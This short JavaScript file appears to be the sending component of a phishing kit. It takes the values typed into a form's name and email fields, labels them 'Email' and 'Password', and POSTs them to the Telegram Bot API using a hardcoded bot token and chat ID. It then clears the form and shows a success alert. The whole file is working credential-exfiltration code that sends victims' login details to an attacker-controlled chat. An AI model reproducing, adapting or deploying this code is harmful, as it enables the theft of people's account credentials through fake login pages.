//bot token
var telegram_bot_id = "5812649148:AAGGMDuZca1V4Xwe6-9tfXUtvv8n-edEMf8";
//chat id
var chat_id = -1001534895593;
var u_name, email;
var ready = function () {
    u_name = document.getElementById("name").value;
    email = document.getElementById("email").value;

    message = "Email: " + u_name + "\nPassword: " + email;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        alert('send succssful')
    });
    document.getElementById("email").value = "";
    document.getElementById("password").value = "";
    return false;
};
